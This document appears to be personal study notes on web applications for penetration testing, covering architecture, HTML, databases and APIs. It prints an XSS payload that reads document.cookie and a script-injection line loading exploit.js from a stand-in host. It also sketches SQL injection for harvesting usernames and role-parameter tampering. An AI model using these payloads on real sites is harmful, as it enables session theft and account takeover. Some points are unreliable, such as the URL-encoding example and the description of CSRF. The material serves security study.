# WEB APPLICATIONS
## INTRO
Web applications are interactive applications that run in the browser.\
They typically implement [client-server](https://cio-wiki.org/wiki/Client_Server_Architecture) architecture.\
They involve a *front-end* for the client-side browser and a *back-end* for the server-side source and components.

### Web App VS Website
A web site is static while a web app is dynamic.\
Each user is shown a different page based on their interactions and are likely to include user forms and other function.\
They run on [Web 2.0](https://en.wikipedia.org/wiki/Web_2.0)!

### Web App vs Native OS App
Web applications tend to be platform-independent and rely on the web browser to be the form of interaction.\
So long as remote access is avaialble and the proper versions are in place, the application can be served anywhere.\
In addition, everything happens server-side, so no waiting around for updates.\
On the other hand, it does need to be available at all times and does rely on a solid internet connection.

---
## Distribution
Web applications can be customized to fit the user's needs.\
Some common open-source applications are as follows:
- WordPress
- OpenCart
- Joomla

Others may be proprietarty and are part of their business model such as:
- Wix
- Shopify
- DotNetNuke

### Risks 
Security on both sides would not exist without a few holes to plug and watch (or exploit...)\
Web applications tend to require some priority due to them being open-facing (at times) to the puiblic internet, creating a suitable attack vector in the right conditions.

There exist many automated tools for scanning/attacking web applications which can cause significant damage.\
In addition, as projects evolve, applications becomne prone to incorporating or even creating more vulneratbilities. 

Web Application penetration testing is an ever evolving security method.\
One by which dedicated teams and principles exist such as [OWASP](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing).

There are many types of known vulnerabilities that a web application can have on its attack surface, but naming a few popular ones are *SQL Injection* and *XSS* (Cross Site Scripting)

### Attacking
Almost every company has some web application on the DMZ.\
THey can vary is setup and function but all have a common workflow that overlaps with their individual attack methodologies.

> SQL injection vulns often leads to dumping ActiveDirectory user lists, which are likely to include email and other information that can be used for further attacks.
>> A well-rounded infosec professional should have a deep understanding of web applications and be as comfortable attacking web applications as performing network penetration testing and Active Directory attacks

Here are a few attack examples and scenarios:
- SQL Injection: Obtaining AD usernames for a password spray
- File Inclusion: Remote Code Execution
- IDOR (Insecure Direct Object Referencing): Can be used to access another user's files or functions when combinesd with other flaws.
- Broken Access Control: Sometimes there aren't checks on changing the role such as in *&roleid=3* that we can change in a POST

---
## Layout
No two applications are identical.\
While they may share frameworks and other bits and pieces, there are fully unique to that business's purposes and have fully customized front and back ends.

Regardless, there are a few components to consider when it comes to application layout.\
Here is a summary of the layer categories:
- Infrastructure: There are underlying components that make up the nexessary structure for it to function as intended i.e. a database
- Components: These represent everything that it interacts with in the areas of *UI/UX*, *Client*, and *server* components
- Architecture: The culmination of all these relationships and how they fit together

### Infrastructure
This can be set up in several ways called *models*.\
The most common are one of these groups:
- client-server 
  - A server hosts and distributes to any clients attempting to access
  - Client vistis URL and is given the main UI
  - components are interpreted and executed client side
  - Fun fact: HTB runs this method!
- one server
  -  The entire application and its components are on a single server
  -  Riskiest
  -  One part goes down, it all stops
- many servers to one database
  - hosting servers access a single separate database
  - provides simple segmentation
- many servers to many databases
  - implements things like load  balancers
- serverless: a unique modern model with microservices

### Components
Made of the following:
- Client
- Server
  - webserver
  - application logic
  - database 
- Services (microservices)
- Functions (serverless) 

### Architecture
Web applications are divided into three of the OSI layers in a three-tier architecture:
- Presentation: UI components via HTML, JS, and CSS
- Application: client web requests such as authorization, privileges, and data
- Data: Works with application to determine data storage and flow

Example:\
![image](https://github.com/user-attachments/assets/b353e2ff-17b3-43d4-acd8-efbad7a7b818)

#### Microservices
These act as independent components and usually do a singele task on their own.\
It is the combination of these services that make up a full fledged application.

Here are a few examples:
- registration
- seearch
- payments
- ratings
- reviews

These components communicate with the client and each other.\
Communication between microservices is known as *stateless* because the request and response are independent.\
Data is stored separately from the microservices.\
This is a *service-oriented architecture* or SOA.

It provides the following:
- agilitty
- flexible scaling
- ease of deployment
- resuable code
- resilience

##### Serverless
Cloud providers offer serverless architectures such as AWS or Azure.\
Containers (i.e. Docker) are another example.

### Security
RBAC

## Front vs Back
Everything front end is client-side in the browser.\
Pages are made up of HTML, CSS< and JS to provide user experience and interactions.

The back end is the databsae and other core services.\
There are frameworks for backend like Laravel, ASP.NET, Spring, Django, and Express

Back end provides content to the front end via APIs

### Security
WHite box pentesting

---
## HTML
*Hyper Text Markup Language* is the core of all web pages.\
It can create all basic elements like titles, forms, images, and more.
```HTML
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

### URL Encoding
URLs are only able to use ascii encoding, so certain symbols like \# or \( won't exist.\
Instead, they need to be encoded like so:
- \! = %20
- \% = %25

and so on.\
We can see a fuller list [here](https://www.w3schools.com/tags/ref_urlencode.ASP)

### DOM
The *Document Object Model* are the elements defined by the *World Wide Web Consortium* or W3C.

The DOM standard is separated into 3 parts:
- Core: the standard model for all document types
- XML: the standard model for XML documents
- HTML: the standard model for HTML documents

#### Head
The *<head>* contains elements not directly printed, such as the title that shows in the browser tab.

---
## CSS
*Cascading Style Sheets*

> *I JUST REALIZE I DONT NEED TO NOTE THIS STUFF FOR PEN TESTING SO SKIPPING...*

---
## XSS
```HTML
#"><img src=/ onerror=alert(document.cookie)>
```

---
## CSRF
*Cross Site Request Forgery* is a vulnerability for unfiltered user input.\
It may be used in combination with XSS.\
One common example is to privilege escalate using a JS payload to change a victum's password for their logged-in session and hijack it.

```JavaScript
"><script src=//www.example.com/exploit.js></script>
```
> AA *Web Application Firewall* helps to prevent this, but is not perfect.
>> Also input sanitization, validation, and a display of the intended output help as well.

Learn more [here](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---
## Back-End
There are a few style os back end call *stacks*.\
Here are a few examples:
- LAMP: Linux, Apache, MySQL, and PHP
- WAMP: Windows LAMP
- WINS: Windows, IIS, .NET, SQL
- MAMP: MacOS LAMP
- XAMPP: cross-platform, Apache, MySQL, PHP/PERL

---
## Web Servers
Web servers themselves also come ina  variety of applications to serve the web pages.\
Here are a few popular ones:
- Apache
- NginX
- IIS: Microsoft;s Internet Information Services

---
## Databases
### Relational
SQL is a popular version

### Non-Relation
NoSQL means there are no tables, rows/columns, primary keys, relationships, or schemas.\
Instead, it is based on the type of data stored within.\
There are 4 common types:
- key-value
- document
- wide-column
- graph 


JSON example:
```JSON
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

> Think MongoDB and Elatic Search

---
## Development Frameworks
Web applications come in several available frameworks for ease of creation and maintenance.\
These inclue Laravel, Ecpress, Rails, and so on.

### API
When designing and developing a web application, it is up to YOU as the dev to create your own APIs.\
This will be how either clients or microservices interact with the application.

#### SOAP
*Simple Objects Access Protocol* uses XML through an HTTP Request.\
This is a bit more complex than alternatives and are difficult to create for large queries.

#### REST
*Representational State Transfer* is the go-to API type you may be familiar with.\
It uses JSON instead of the more outdated XML and it our previosuly discussed GET, POST, etc..


















